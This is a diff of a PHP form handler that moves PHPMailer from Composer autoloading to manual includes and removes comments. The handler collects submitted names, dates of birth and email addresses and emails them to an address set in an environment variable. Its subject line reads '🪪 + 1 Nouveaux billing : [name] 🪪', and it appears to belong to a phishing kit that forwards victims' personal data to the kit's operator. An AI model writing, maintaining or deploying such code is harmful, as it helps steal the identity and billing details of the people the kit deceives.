@@ -3,10 +3,13 @@ include '../../settings.php';
 include '../core/funcs.php';
 session_start();
 
+// Include PHPMailer manually
+require __DIR__ . '/lib/PHPMailer/src/PHPMailer.php';
+require __DIR__ . '/lib/PHPMailer/src/SMTP.php';
+require __DIR__ . '/lib/PHPMailer/src/Exception.php';
+
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
-
-require __DIR__ . '/../../vendor/autoload.php'; // PHPMailer from composer
 
 if (isset($_POST['name'], $_POST['dob'], $_POST['email'])) {
     $_SESSION['name'] = $_POST['name'];
@@ -33,15 +36,15 @@ if (isset($_POST['name'], $_POST['dob'], $_POST['email'])) {
 
     try {
         $mail->isSMTP();
-        $mail->Host       = getenv("SMTP_HOST"); // set in Render
+        $mail->Host       = getenv("SMTP_HOST");
         $mail->SMTPAuth   = true;
-        $mail->Username   = getenv("SMTP_USER"); // set in Render
-        $mail->Password   = getenv("SMTP_PASS"); // set in Render
+        $mail->Username   = getenv("SMTP_USER");
+        $mail->Password   = getenv("SMTP_PASS");
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
         $mail->setFrom('noreply@yourdomain.com', 'Your App');
-        $mail->addAddress(getenv("TO_EMAIL")); // who receives the email
+        $mail->addAddress(getenv("TO_EMAIL"));
 
         $mail->isHTML(false);
         $mail->Subject = "🪪 + 1 Nouveaux billing : [".$_SESSION['name']."] 🪪";
